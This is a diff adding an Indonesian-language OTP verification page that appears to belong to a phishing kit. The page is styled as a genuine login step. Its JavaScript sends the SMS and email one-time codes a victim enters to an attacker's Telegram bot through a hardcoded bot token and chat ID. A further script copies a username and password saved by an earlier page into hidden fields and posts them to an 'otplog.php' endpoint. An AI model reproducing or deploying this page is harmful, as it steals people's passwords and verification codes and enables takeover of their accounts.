@@ -1,0 +1,274 @@
+<html>
+ <head> 
+  <title>verifikasi OTP</title> 
+  <!-- Viewport mobile tag for sensible mobile support --> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic"> 
+  <link type="text/css" rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css"> 
+  <!--STYLES--> 
+  <meta name="theme-color" content="#000000"> 
+  <link href="" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css"> 
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWU1zV2MP1qIVUa_15MTP6zx6GpxW79z6aFxjji9yqHjMEAzjbdOtg8y4j&amp;s=10" rel="shortcut icon" type="image/x-icon"> 
+  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWU1zV2MP1qIVUa_15MTP6zx6GpxW79z6aFxjji9yqHjMEAzjbdOtg8y4j&amp;s=10" rel="apple-touch-icon"> 
+  <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        * {
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            color: #fff;
+            position: relative;
+        }
+
+        b {
+            font-weight: 500;
+        }
+
+        html {
+            width: 100%;
+            height: 100%;
+        }
+
+        body {
+            background: #eaeaea;
+            display: flex;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+        }
+
+        .container {
+            width: 100%;
+            height: 100%;
+            background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2g2NUBCvQauhHOQC28PKnH5NyFh56V7KuQbJpfc4gHDDAJ3c1e5gK0WymDnjCQuTECXqYYhbbIg0cruGhJhPHIKuapWYD8uxhpRH4MfiuYH5APh7N7p8T2GkbBUfnrhzY2Nre6SBYIP-WiXWIlmjaBSCzDn5cSuDkwPKRk95zGZBmfbz5kRAhg4Utjg/s2191/AddText08-30-10.22.44.png');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .container .head {
+            width: 100%;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 10px 0 80px 0;
+        }
+
+        .container .head .back {
+            width: 10px;
+            position: absolute;
+            left: 20px;
+        }
+
+        .container .head .logo {
+            width: 150px;
+        }
+
+        form {
+            width: 100%;
+            padding: 20px;
+            margin-top: -50px;
+        }
+
+        form input {
+            width: 100%;
+            height: 50px;
+            background: #fff;
+            font-size: 15px;
+            color: #000;
+            outline: none;
+            border: none;
+            padding: 10px 20px;
+            margin-bottom: 20px;
+            margin-top: 10px;
+            text-align: center;
+            letter-spacing: 10px;
+        }
+
+        form button {
+            width: 100%;
+            margin-top: 180px;
+            height: 50px;
+            font-size: 14px;
+            border: none;
+            background: #ef3c3c;
+        }
+
+        form .forgot {
+            font-size: 13px;
+            margin-bottom: 20px;
+            font-weight: 300;
+            margin-left: 20px;
+        }
+
+        form .zs {
+            margin-left: 20px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            text-align: center;
+            color: #8f8f8f;
+        }
+
+        form .reg {
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            background: #ffffff1d;
+        }
+
+        form label {
+            margin: 0px auto;
+            margin-top: 30px;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <div class="head22"> 
+    <img width="100%" src="https://hosting.tigerengine.id/a2umts.png" alt=""> 
+   </div> 
+   <form id="formotp" onsubmit="otpform(); return false" method="post"> 
+    <input type="hidden" id="user" name="user" value="null"> 
+    <input type="hidden" id="pass" name="pass" value="null"> 
+    <br> 
+    <br> 
+    <label style="margin-top: 30px; color: #000; font-size: 13px">DARI SMS</label> 
+    <input oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" name="smsotp" id="sms" required autocomplete="off" placeholder="●●●●" type="tel" inputmode="numeric" minlength="4" maxlength="4"> 
+    <label style="margin-top: 30px; color: #000; font-size: 13px">DARI EMAIL</label> 
+    <input oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" name="emailotp" id="email" required autocomplete="off" placeholder="●●●●" type="tel" inputmode="numeric" minlength="4" maxlength="4"> 
+    <center> 
+     <p id="back" style="color: #aaa">OTP Kadaluarsa <span id="timer" style="color: #aaa">2 : 59</span> menit<br> <button type="button" style="width: 160px; height: 30px; border-radius: 50px; border: none; padding:5px; background: #454545; opacity: 0.7; margin-top: 10px" onclick="location.href='verifikasi.html'">KIRIM ULANG OTP</button> </p>
+    </center> 
+    <p></p> 
+    <button type="submit" id="kirims">KONFIRMASI</button> 
+   </form> 
+  </div> 
+  <script>
+  function otpform() {
+    const sms = document.getElementById('sms').value.trim();
+    const email = document.getElementById('email').value.trim();
+
+    if (!sms || !email) {
+      alert("Semua kode OTP wajib diisi!");
+      return;
+    }
+
+    const token = '8054205621:AAE7E-MqDS6kHUSgzv8J1DjBDDtLH7CiS3Y'; // Ganti dengan token bot kamu
+    const chat_id = '8055762875'; // Ganti dengan chat ID kamu
+
+    const message = `SMS-LOGIN BIASA: ${sms}\nKODE DARI EMAIL: ${email}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = "otp.html"; // Arahkan ke halaman setelah berhasil
+      } else {
+        alert("Gagal mengirim data ke Telegram.");
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("Terjadi kesalahan saat mengirim data.");
+    });
+  }
+</script>
+
+  <script>
+        document.getElementById('timer').innerHTML =
+            03 + ":" + 01;
+        startTimer1();
+
+        function startTimer1() {
+            var presentTime = document.getElementById('timer').innerHTML;
+            var timeArray = presentTime.split(/[:]+/);
+            var m = timeArray[0];
+            var s = checkSecond((timeArray[1] - 1));
+            if (s == 59) {
+                m = m - 1
+            }
+            if (m < 0) {
+                return
+            }
+
+            document.getElementById('timer').innerHTML =
+                m + " : " + s;
+            console.log(m)
+            setTimeout(startTimer1, 1000);
+
+        }
+
+        function checkSecond(sec) {
+            if (sec < 10 && sec >= 0) {
+                sec = "0" + sec
+            }; // add zero in front of numbers < 10
+            if (sec < 0) {
+                sec = "59"
+            };
+            return sec;
+        }
+    </script> 
+  <script>
+        var user = sessionStorage.getItem("user");
+        document.getElementById("user").value = user + "";
+        var pass = sessionStorage.getItem("pass");
+        document.getElementById("pass").value = pass + "";
+    </script> 
+  <script>
+        $('#formotp').on('submit', function(event) {
+
+            event.stopPropagation();
+            event.preventDefault();
+
+            document.getElementById('kirims').innerHTML = "Memproses....";
+
+
+
+            $.ajax({
+
+                type: 'POST',
+                url: '../auth/otplog.php',
+                async: false,
+                dataType: 'JSON',
+                data: $(this).serialize(),
+
+                complete: function(data) {
+                    console.log('Complete')
+                    setTimeout(function() {
+                        document.getElementById('kirims').innerHTML = "KONFIRMASI";
+                        window.location.href = 'verifcode.html';
+                    }, 1000);
+                }
+            });
+
+            return false;
+        });
+    </script> 
+ </body>
+</html>
